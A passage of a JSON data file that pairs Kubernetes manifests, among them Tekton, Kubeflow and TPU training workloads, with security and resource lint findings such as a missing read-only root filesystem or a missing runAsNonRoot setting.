5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"webhook\" does not have a read-only root file system"
  },
  {
    "id": "1853",
    "manifest_path": "data/manifests/the_stack_sample/sample_0413.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tekton-pipelines-webhook\n  namespace: tekton-pipelines\n  labels:\n    app.kubernetes.io/name: webhook\n    app.kubernetes.io/component: webhook\n    app.kubernetes.io/instance: default\n    app.kubernetes.io/version: v0.18.0\n    app.kubernetes.io/part-of: tekton-pipelines\n    pipeline.tekton.dev/release: v0.18.0\n    version: v0.18.0\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: webhook\n      app.kubernetes.io/component: webhook\n      app.kubernetes.io/instance: default\n      app.kubernetes.io/part-of: tekton-pipelines\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n      labels:\n        app.kubernetes.io/name: webhook\n        app.kubernetes.io/component: webhook\n        app.kubernetes.io/instance: default\n        app.kubernetes.io/version: v0.18.0\n        app.kubernetes.io/part-of: tekton-pipelines\n        pipeline.tekton.dev/release: v0.18.0\n        app: tekton-pipelines-webhook\n        version: v0.18.0\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: webhook\n                  app.kubernetes.io/component: webhook\n                  app.kubernetes.io/instance: default\n                  app.kubernetes.io/part-of: tekton-pipelines\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: tekton-pipelines-webhook\n      containers:\n      - name: webhook\n        image: gcr.io/tekton-releases/github.com/tektoncd/pipeline/cmd/webhook:v0.18.0@sha256:622f9d84bc56c12e883f4e5a3936d1321ed369655ea88dc8f7ab61c0108f72dd\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: CONFIG_LEADERELECTION_NAME\n          value: config-leader-election\n        - name: WEBHOOK_SERVICE_NAME\n          value: tekton-pipelines-webhook\n        - name: WEBHOOK_SECRET_NAME\n          value: webhook-certs\n        - name: METRICS_DOMAIN\n          value: tekton.dev/pipeline\n        securityContext:\n          allowPrivilegeEscalation: false\n          runAsUser: 65532\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        - name: https-webhook\n          containerPort: 8443\n        - name: probes\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"tekton-pipelines-webhook\" not found"
  },
  {
    "id": "1854",
    "manifest_path": "data/manifests/the_stack_sample/sample_0414.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test-deployment\n  labels:\n    app: test-deployment\nspec:\n  selector:\n    matchLabels:\n      app: test-deployment\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test-deployment\n    spec:\n      containers:\n      - name: tester\n        image: ubuntu:latest\n        command:\n        - bash\n        - -c\n        - 'echo \"Falling asleep for $SECS_TO_SLEEP\"\n\n          sleep $SECS_TO_SLEEP\n\n          '\n        env:\n        - name: SECS_TO_SLEEP\n          value: '1000'\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tester\" is using an invalid container image, \"ubuntu:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1855",
    "manifest_path": "data/manifests/the_stack_sample/sample_0414.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test-deployment\n  labels:\n    app: test-deployment\nspec:\n  selector:\n    matchLabels:\n      app: test-deployment\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test-deployment\n    spec:\n      containers:\n      - name: tester\n        image: ubuntu:latest\n        command:\n        - bash\n        - -c\n        - 'echo \"Falling asleep for $SECS_TO_SLEEP\"\n\n          sleep $SECS_TO_SLEEP\n\n          '\n        env:\n        - name: SECS_TO_SLEEP\n          value: '1000'\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tester\" does not have a read-only root file system"
  },
  {
    "id": "1856",
    "manifest_path": "data/manifests/the_stack_sample/sample_0414.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test-deployment\n  labels:\n    app: test-deployment\nspec:\n  selector:\n    matchLabels:\n      app: test-deployment\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test-deployment\n    spec:\n      containers:\n      - name: tester\n        image: ubuntu:latest\n        command:\n        - bash\n        - -c\n        - 'echo \"Falling asleep for $SECS_TO_SLEEP\"\n\n          sleep $SECS_TO_SLEEP\n\n          '\n        env:\n        - name: SECS_TO_SLEEP\n          value: '1000'\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tester\" is not set to runAsNonRoot"
  },
  {
    "id": "1857",
    "manifest_path": "data/manifests/the_stack_sample/sample_0419.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jupyter-web-app\" does not have a read-only root file system"
  },
  {
    "id": "1858",
    "manifest_path": "data/manifests/the_stack_sample/sample_0419.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jupyter-web-app-service-account\" not found"
  },
  {
    "id": "1859",
    "manifest_path": "data/manifests/the_stack_sample/sample_0419.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jupyter-web-app\" is not set to runAsNonRoot"
  },
  {
    "id": "1860",
    "manifest_path": "data/manifests/the_stack_sample/sample_0419.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jupyter-web-app\" has cpu request 0"
  },
  {
    "id": "1861",
    "manifest_path": "data/manifests/the_stack_sample/sample_0419.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jupyter-web-app\" has memory limit 0"
  },
  {
    "id": "1862",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "1863",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "1864",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "1865",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "1866",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
